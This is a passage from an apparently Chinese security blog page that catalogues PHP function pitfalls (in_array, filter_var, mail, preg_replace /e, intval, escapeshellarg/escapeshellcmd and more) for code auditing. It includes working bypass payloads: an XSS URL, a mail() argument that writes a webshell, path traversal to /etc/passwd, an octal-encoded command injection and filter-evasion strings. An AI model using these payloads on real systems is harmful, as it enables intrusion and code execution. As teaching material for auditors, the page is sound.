class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">$one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">$nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">$number = &apos;3735929054&apos;;</span><br><span class="line">// Check all the input characters!</span><br><span class="line">for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line">// Disallow all the digits!</span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line">if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">return &quot;flase&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($number == $temp)</span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="9-科学计数法"><a href="#9-科学计数法" class="headerlink" title="9.科学计数法"></a>9.科学计数法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999</span><br><span class="line"></span><br><span class="line">payload==&gt;1e9</span><br></pre></td></tr></table></figure><h4 id="10-in-array"><a href="#10-in-array" class="headerlink" title="10.in_array"></a>10.in_array</h4><p>语法：in_array(search,array,type)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>search</td><td>必需。规定要在数组搜索的值。</td></tr><tr><td>array</td><td>必需。规定要搜索的数组。</td></tr><tr><td>type</td><td>可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p>注意：in_array()的第三个参数在默认情况下是false，因此 PHP 会尝试将文件名自动转换为整数再进行判断，导致该判断可被绕过。</p><p>例如如下代码在13 行存在任意文件上传漏洞。 在 12 行代码通过 <code>in_array()</code> 来判断文件名是否为整数，可是未将 <code>in_array()</code> 的第三个参数设置为 true 。<code>in_array()</code>的第三个参数在默认情况下是false，因此 PHP 会尝试将文件名自动转换为整数再进行判断，导致该判断可被绕过。比如使用文件名为 5vulnspy.php 的文件将可以成功通过 <code>in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist)</code> 判断，从而将恶意的 PHP 文件上传到服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class Challenge &#123;</span><br><span class="line">    const UPLOAD_DIRECTORY = &apos;./solutions/&apos;;</span><br><span class="line">    private $file;</span><br><span class="line">    private $whitelist;</span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">        $this-&gt;whitelist = range(1, 24);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                $this-&gt;file[&apos;tmp&apos;],</span><br><span class="line">                self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = new Challenge($_FILES[&apos;solution&apos;]);</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$myarray = range(1,24); </span><br><span class="line">in_array(&apos;5vulnspy.php&apos;,$myarray);         //true</span><br><span class="line">in_array(&apos;5vulnspy.php&apos;,$myarray,true);    //false</span><br></pre></td></tr></table></figure><p>注:array_search()与in_array()也是一样的问题。</p><h4 id="11-filter-var"><a href="#11-filter-var" class="headerlink" title="11.filter_var"></a>11.filter_var</h4><p>filter_var()的URL过滤非常的弱，只是单纯的从形式上检测并没有检测协议。测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(filter_var(&apos;vulnspy.com&apos;, FILTER_VALIDATE_URL));           # false</span><br><span class="line">var_dump(filter_var(&apos;http://vulnspy.com&apos;, FILTER_VALIDATE_URL));    # http://vulnspy.com</span><br><span class="line">var_dump(filter_var(&apos;xxxx://vulnspy.com&apos;, FILTER_VALIDATE_URL));    # xxxx://vulnspy.com</span><br><span class="line">var_dump(filter_var(&apos;http://vulnspy.com&gt;&apos;, FILTER_VALIDATE_URL));   # false</span><br></pre></td></tr></table></figure><p>这种情况下可以采用如下payload<code>javascript://comment%250aalert(1)</code>来触发XSS</p><p>注：%250a即%0a表示换行符，上面的payload会被换行，并且//表示注释。最终触发后将得到如下形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript://comment</span><br><span class="line">alert(1)</span><br></pre></td></tr></table></figure><h4 id="12-class-exist"><a href="#12-class-exist" class="headerlink" title="12.class_exist"></a>12.class_exist</h4><p>以class_exist()为例的下列函数会在在PHP 5.4以下版本中存在任意文件包含漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">class_exists()</span><br><span class="line">class_implements()</span><br><span class="line">class_parents()</span><br><span class="line">class_uses()</span><br><span class="line">get_class_methods()</span><br><span class="line">get_class_vars()</span><br><span class="line">get_parent_class()</span><br><span class="line">interface_exists()</span><br><span class="line">is_a()</span><br><span class="line">is_callable()</span><br><span class="line">is_subclass_of()</span><br><span class="line">method_exists()</span><br><span class="line">property_exists()</span><br><span class="line">spl_autoload_call()</span><br><span class="line">trait_exists()</span><br></pre></td></tr></table></figure><p>注：class_exists()会检查是否存在对应的类，当调用class_exists()函数时会触发用户定义的<strong>autoload()函数，用于加载找不到的类(这个特性是因为class_exists函数中的$autoload参数，默认是true造成的)。所以如果我们输入../../../../etc/passwd是，就会调用class_exists()，这样就会触发</strong>autoload(),这样就是一个任意文件包含的漏洞了。</p><p>注: PHP5~5.3(包含5.3版本)版本 之间才可以使用路径穿越符号”../“。</p><p>此外，还存在一个blind xxe的漏洞，由于存在class_exists()，所以我们可以调用PHP的内置函数,并且通过$controller = new $controllerName($data);进行实例化。借助与PHP中的SimpleXMLElement类来完成XXE攻击。</p><p>xxe漏洞实例参考：</p><p><a href="https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/" target="_blank" rel="noopener">shopware blind xxe</a></p><p><a href="http://bobao.360.cn/learning/detail/3082.html" target="_blank" rel="noopener">我是如何黑掉“Pornhub”来寻求乐趣和赢得10000$的奖金</a></p><p>参考：<br><a href="https://stackoverflow.com/questions/3812851/there-is-a-way-to-use-class-exists-and-autoload-without-crash-the-script" target="_blank" rel="noopener">stackoverflow:class_exists&amp;autoload：</a></p><h4 id="13-mail"><a href="#13-mail" class="headerlink" title="13.mail"></a>13.mail</h4><p>mail()中的第五个参数可以-X的方式写入webshell。</p><p>payload：<a href="mailto:`example@example.com" target="_blank" rel="noopener">`example@example.com</a> -OQueueDirectory=/tmp -X/var/www/html/rce.php`</p><p>这个PoC的功能是在Web目录中生成一个PHP webshell。该文件（rce.php）包含受到PHP代码污染的日志信息</p><p>escapeshellarg()和filter_var()不安全的问题参考<a href="https://www.anquanke.com/post/id/86015" target="_blank" rel="noopener">在PHP应用程序开发中不正当使用mail()函数引发的血案</a></p><p>escapeshellarg和escapeshellcmd联合使用从而造成的安全问题参考<a href="https://paper.seebug.org/164/#" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p><h4 id="14-正则表达式可能存在问题"><a href="#14-正则表达式可能存在问题" class="headerlink" title="14.正则表达式可能存在问题"></a>14.正则表达式可能存在问题</h4><p>(1)<br>如本意想将非a-z、.、-、<em>全部替换为空，但是正则表达式写成了`[^a-z.-</em>]`，其中没有对-进行转义，那么-表示一个列表，例如[1-9]表示的数字1到9，但是如果[1-9]表示就是字母1、-和9。所以[^a-z.-_]表示的就是非ascii表中的序号为46至122的字母替换为空。那么此时的../…/就不会被匹配，就可以进行目录穿越，从而造成任意文件删除了。</p><p>(2)在反序列化漏洞中对于<code>preg_match(&#39;/O:\d:/&#39;, $data)</code>这样的正则可以采用在对象长度前添加一个+号，即o:14-&gt;o:+14来进行绕过。</p><p>参考：<a href="http://www.phpbug.cn/archives/32.html" target="_blank" rel="noopener">php反序列unserialize的一个小特性</a></p><h4 id="15-parse-str"><a href="#15-parse-str" class="headerlink" title="15.parse_str"></a>15.parse_str</h4><p>parse_str()可以在参数可控的情况下可以造成变量覆盖漏洞</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$var = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);</span><br><span class="line">parse_str($var[&apos;query&apos;]);</span><br></pre></td></tr></table></figure><h4 id="16-preg-replace"><a href="#16-preg-replace" class="headerlink" title="16.preg_replace"></a>16.preg_replace</h4><p>preg_replace() /e 模式可以执行任意代码，例子如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Type: text/plain&quot;);</span><br><span class="line"></span><br><span class="line">function complexStrtolower($regex, $value) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &apos;/(&apos; . $regex . &apos;)/ei&apos;,</span><br><span class="line">        &apos;strtolower(&quot;\\1&quot;)&apos;,</span><br><span class="line">        $value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $regex =&gt; $value) &#123;</span><br><span class="line">    echo complexStrtolower($regex, $value) . &quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_replace的参数含义参考 <a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">PHP手册–preg_replace</a></p><p>在此处我们可以看到有两处的值是我们可以操控的，但是只有在’strtolower(“\1”)’这个位置的参数才可以执行代码，所以关键就在这儿。 \1是具有特殊含义的，在这儿就是就是指定第一个子匹配项,也即${phpinfo()}，进而达到执行代码的目的</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">深入研究preg_replace与代码执行</a></p><p><a href="http://php.net/manual/zh/regexp.reference.back-references.php" target="_blank" rel="noopener">后向引用</a></p><p><a href="https://www.cdxy.me/?p=756" target="_blank" rel="noopener">一个PHP正则相关的“经典漏洞”</a></p><h4 id="17-str-replace"><a href="#17-str-replace" class="headerlink" title="17.str_replace"></a>17.str_replace</h4><p>str_replace()函数是单次替换而不是多次替换，因而可以通过双写敏感词汇过滤，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str_replace(&apos;../&apos;, &apos;&apos;, $language);</span><br><span class="line">//payload:..././或者....//</span><br></pre></td></tr></table></figure><h4 id="18-header"><a href="#18-header" class="headerlink" title="18.header"></a>18.header</h4><p>使用header()进行跳转的时候没有使用exit()或者是die()，导致后续的代码任然可以执行。如果后面存在危险函数，那么将会触发漏洞。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">function goAway() &#123;</span><br><span class="line">    error_log(&quot;Hacking attempt.&quot;);</span><br><span class="line">    header(&apos;Location: /error/&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">    goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!assert(&quot;(int)$pi == 3&quot;)) &#123;</span><br><span class="line">    echo &quot;This is not pi.&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;This might be pi.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处就可以POST一个<code>pi=phpinfo()</code>来借助assert()函数触发代码执行漏洞</p><h4 id="19-intval"><a href="#19-intval" class="headerlink" title="19.intval"></a>19.intval</h4><p>特性1:</p><p>intval()函数执行成功时返回 变量的10进制值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。</p><p>特性2:</p><p>整数溢出、向下取整和整形判断存在问题</p><p>(1)整数溢出</p><p>32位系统最大的带符号范围为-2147483648 到 2147483647，64位最大的是 9223372036854775807。因此，在32位系统上 intval(‘1000000000000’) 会返回 2147483647</p><p>(2)向下取整</p><p>intval(10.99999)会返回10，intval和int等取整都是’截断’取整，并不是四舍五入</p><p>(3)intval函数进去取整时，是直到遇上数字或者正负号才开始进行转换，之后在遇到非数字或者结束符号（\0）时结束转换</p><p>特性3:</p><p>intval()函数会忽略’’ ‘\n’、’\r’、’\t’、’\v’、’\0’ ，也就是说intval(“\r\n\t 12”) &gt;&gt; 12</p><h4 id="20-htmlentities"><a href="#20-htmlentities" class="headerlink" title="20.htmlentities"></a>20.htmlentities</h4><p>htmlentities默认情况下不会对单引号进行转义。</p><h4 id="21-addslashes"><a href="#21-addslashes" class="headerlink" title="21.addslashes"></a>21.addslashes</h4><p>在进行了addslashes之后进行了截断，在一些情况下就有可能能够获得一个引号。</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function sanitizeInput($input, $length = 20) &#123;</span><br><span class="line">    $input = addslashes($input);</span><br><span class="line">    if (strlen($input) &gt; $length) &#123;</span><br><span class="line">        $input = substr($input, 0, $length);</span><br><span class="line">    &#125;</span><br><span class="line">    return $input;</span><br><span class="line">&#125;</span><br><span class="line">$test = &quot;1234567890123456789&apos;&quot;;</span><br><span class="line">var_dump(sanitizeInput($test));</span><br><span class="line"></span><br><span class="line">//output:1234567890123456789\</span><br></pre></td></tr></table></figure><p>此处输出的刚好是带有一个\，而’则因为长度限制被截断，从而可以出发SQL注入漏洞</p><h4 id="22-小特性"><a href="#22-小特性" class="headerlink" title="22.小特性"></a>22.小特性</h4><p>(1)php自身在解析请求的时候，如果参数名字中包含空格、.、[这几个字符，会将他们转换成_。但是通过<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>方式获得的参数并不会进行转换。</p><p>(2)$_REQUEST是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续GET，POST 和 COOKIE发生了变化，也不会影响$_REQUEST的结果</p><p>参考：</p><p><a href="https://blog.spoock.com/2018/05/05/request-vuln-analysis/" target="_blank" rel="noopener">《request导致的安全性问题分析》</a></p><p><a href="https://blog.csdn.net/u011721501/article/details/51824576" target="_blank" rel="noopener">《PHP的两个特性导致waf绕过注入》</a></p><p>(3)PHP中的<code>&quot;&quot;</code>是可以执行代码的，因而在payload中常采用<code>&quot;&lt;?php phpinfo();&gt;&quot;</code></p><h4 id="23"><a href="#23" class="headerlink" title="23. ++"></a>23. ++</h4><p>PHP中的自增符号++在如下情况中不会有任何意义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$test=123; echo $test++;  # 123</span><br></pre></td></tr></table></figure><p>因此像下面代码所示的一样，就可能回产生变量覆盖漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach ($input as $field =&gt; $count) &#123;</span><br><span class="line">    $this-&gt;$field = $count++;</span><br><span class="line">&#125;</span><br><span class="line">//这里的$count++在此并没有立即对值进行了修改</span><br></pre></td></tr></table></figure><p>提示：当然如果++$count形式的话，也是可以存在变量覆盖的，因为在进行++操作时会进行隐式类型转换，如果能够转换成功，则会进行加法操作；如果不能转换成功，则将最后一个字符进行加法操作。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$test = 123; echo ++$test;      // 124</span><br><span class="line">$test = &apos;123&apos;; echo ++$test;    // 124</span><br><span class="line">$test = &apos;1ab&apos;; echo ++$test;    // &apos;1ac&apos;</span><br><span class="line">$test = &apos;ab1&apos;; echo ++$test;    // &apos;ab2&apos;</span><br><span class="line">$test = &apos;a1b&apos;; echo ++$test;    // &apos;a1c&apos;</span><br><span class="line">$test =array(2,&apos;name&apos;=&gt;&apos;wyj&apos;); echo ++$test;    //Array123</span><br><span class="line"></span><br><span class="line">//所以我们构造shell.php4或者shell.pho这样的，在自增操作后就会变成我们想要的shell.php5或者shell.php</span><br></pre></td></tr></table></figure><h4 id="24-openssl-verify"><a href="#24-openssl-verify" class="headerlink" title="24.openssl_verify"></a>24.openssl_verify</h4><p>依据openssl_verify()的定义有</p><blockquote><p>如果签名正确返回 1, 签名错误返回 0, 内部发生错误则返回-1.</p></blockquote><p>如果单独采用如下形式的判断就会出现问题，因为if判断只有遇到0或者是false返回的才是false。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">    $object = json_decode(base64_decode($data));</span><br><span class="line">    $this-&gt;loginAsUser($object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="25-stripcslashes"><a href="#25-stripcslashes" class="headerlink" title="25.stripcslashes"></a>25.stripcslashes</h4><p>stripcslashes函数</p><blockquote><p>返回反转义后的字符串。可识别类似 C 语言的 \n，\r，… 八进制以及十六进制的描述。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(stripcslashes(&apos;0\073\163\154\145\145\160\0405\073&apos;));      // 0;sleep 5;</span><br></pre></td></tr></table></figure><p>因而对于下面这种形式我们可以采用将命令转换为八进制的形式进行绕过正则判断并触发命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function createThumbnail() &#123;</span><br><span class="line">    $e = stripcslashes(</span><br><span class="line">        preg_replace(</span><br><span class="line">            &apos;/[^0-9\\\]/&apos;,</span><br><span class="line">            &apos;&apos;,</span><br><span class="line">            isset($_GET[&apos;size&apos;]) ? $_GET[&apos;size&apos;] : &apos;25&apos;</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    system(&quot;/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e</span><br><span class="line">            ./thumbs/&#123;$this-&gt;file&#125;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="26-set-error-handler"><a href="#26-set-error-handler" class="headerlink" title="26.set_error_handler"></a>26.set_error_handler</h4><p>若错误配置此函数，将会造成信息泄露进而造成漏洞产生，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(function ($no, $str, $file, $line) &#123;</span><br><span class="line">    throw new ErrorException($str, 0, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br></pre></td></tr></table></figure><p>这里的设置就相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(E_ALL);</span><br><span class="line">ini_set(&apos;display_errors&apos;, TRUE);</span><br><span class="line">ini_set(&apos;display_startup_errors&apos;, TRUE);</span><br></pre></td></tr></table></figure><p>这种配置将会泄露所有的错误信息</p><h4 id="27-declare与array-walk"><a href="#27-declare与array-walk" class="headerlink" title="27.declare与array_walk"></a>27.declare与array_walk</h4><p>针对PHP7版本</p><p>PHP7中引入了declare(strict_types=1);这种声明方式，在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">declare(strict_types=1);</span><br><span class="line">function addnum(int $a,int $b) &#123;</span><br><span class="line">    return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">$result = addnum(1,2);</span><br><span class="line">var_dump($result);              // 输出3</span><br><span class="line">$result = addnum(&apos;1&apos;,&apos;2&apos;);</span><br><span class="line">var_dump($result);              //出现Fatal error: Uncaught TypeError，Argument 1 passed to addnum() must be of the type integer, string given,程序出错，参数的数据类型不匹配</span><br></pre></td></tr></table></figure></p><p>但是通过array_walk()调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">declare(strict_types=1);</span><br><span class="line">function addnum(int &amp;$value) &#123;</span><br><span class="line">    $value = $value+1;</span><br><span class="line">&#125;</span><br><span class="line">$input = array(&apos;3a&apos;,&apos;4b&apos;);</span><br><span class="line">array_walk($input,addnum);</span><br><span class="line">var_dump($input);//array(4,5)</span><br></pre></td></tr></table></figure></p><p>因此利用array_walk()的这种特性，我们可以传入任意字符进去，进而触发相应的漏洞。</p><h4 id="28-ldap-escape"><a href="#28-ldap-escape" class="headerlink" title="28.ldap_escape"></a>28.ldap_escape</h4><blockquote><p><strong>string ldap_escape ( string $value [, string $ignore [, int $flags ]] )</strong></p><p><strong>value</strong></p><p>The value to escape.</p><p><strong>ignore</strong></p><p>Characters to ignore when escaping.</p><p><strong>flags</strong></p><p>The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs.</p></blockquote><p>当使用ldap_search()时需要选择LDAP_ESCAPE_FILTER过滤字符串，但是如果选择LDAP_ESCAPE_DN将会导致过滤无效</p><h4 id="29-strip-tags-amp-amp-preg-replace"><a href="#29-strip-tags-amp-amp-preg-replace" class="headerlink" title="29.strip_tags &amp;&amp; preg_replace"></a>29.strip_tags &amp;&amp; preg_replace</h4><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$textMsg = trim(strip_tags(preg_replace(&apos;/&lt;(head|title|style|script)[^&gt;]*&gt;.*?&lt;\/\\1&gt;/s&apos;，&apos;&apos;，$message)));</span><br></pre></td></tr></table></figure><p>目的很明显–去掉所有的标签和内容。首先使用<code>preg_replace</code>过滤掉标签、标签内容、标签属性，接着又使<code>用strip_tags</code>去掉其余的html和php标记。</p><p>正常输入没问题–如:<code>&lt;head&gt;evil&lt;/head&gt;</code>，得到的结果是空，即全部都被过滤了。</p><p>结果很悲惨–如果攻击者输入<code>&lt;head&gt;evil&lt;/headend&gt;</code>或者<code>&lt;he&lt;&gt;ad&gt;evil&lt;/head&gt;</code>之类，就会导致evil字符串逃逸，攻击者利用evil字符串再结合上下文说不定就能够造成漏洞。</p><h4 id="30-escapeshellarg-amp-amp-escapeshellcmd"><a href="#30-escapeshellarg-amp-amp-escapeshellcmd" class="headerlink" title="30.escapeshellarg &amp;&amp; escapeshellcmd"></a>30.escapeshellarg &amp;&amp; escapeshellcmd</h4><blockquote><p>escapeshellarg 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</p></blockquote><blockquote><p>escapeshellcmd 会对&amp;#;|*?~&lt;&gt;^()[]{}$\， \x0A 和 \xFF进行转义，’和 “仅在不配对儿的时候被转义</p></blockquote><p>需要注意的是escapeshellarg和escapeshellcmd在win平台和linux平台的表现是不一样的。他们两者造成的漏洞也主要是在Linux平台下。接下来主要是说明在Linux平台下的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$msg = &quot;123&apos;456&quot;;</span><br><span class="line">echo escapeshellarg($msg)  // 结果是： &apos;123&apos;\&apos;&apos;456&apos;</span><br><span class="line">echo escapeshellcmd($msg)  // 结果是: 123\&apos;456</span><br></pre></td></tr></table></figure><p>当两者混合使用时，就会出现问题。代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$parameter1 = escapeshellarg($parameter)</span><br><span class="line">$parameter2 = escapeshellcmd($parameter1)</span><br><span class="line">system(&quot;curl &quot;.$parameter2)</span><br></pre></td></tr></table></figure><p>假设我们传入的$parameter为<code>172.17.0.2&#39; -v -d a=1</code>，那么经过escapeshellarg之后变为<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>。之后经过escapeshellcmd变为<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，此时\的存在后面得’不会被转义，所以后面的两个’’变为了空白字符。那么最后实际的命令为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，成功地逃逸了单引号。</p><p>这两个函数联合使用之后可以造成单引号逃逸，这样就很有可能会造成漏洞，利用的方式就需要看具体的应用场景了。</p><h4 id="31-addslashes-amp-amp-basename"><a href="#31-addslashes-amp-amp-basename" class="headerlink" title="31.addslashes &amp;&amp; basename"></a>31.addslashes &amp;&amp; basename</h4><p>basename的主要用法是：</p><blockquote><p>给出一个包含有指向一个文件的全路径的字符串，basename()函数返回基本的文件名。如果是在windows环境下，路径中的斜线(/)和反斜线()都可以用作目录分割符，在其他环境下是斜线(/)</p></blockquote><p>示例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">在 win平台下</span><br><span class="line">$mypath1 = &apos;C:/Users/monkey/1.txt&apos;;</span><br><span class="line">$name1 = basename($mypath1);</span><br><span class="line">var_dump($name1);       // 1.txt</span><br><span class="line">$mypath2 = &apos;C:\Users\monkey\2.txt&apos;;</span><br><span class="line">$name2 = basename($mypath2);</span><br><span class="line">var_dump($name2);       // 2.txt</span><br><span class="line"></span><br><span class="line">在Linux平台下</span><br><span class="line">$mypath1 = &apos;C:/Users/monkey/1.txt&apos;;</span><br><span class="line">$name1 = basename($mypath1);</span><br><span 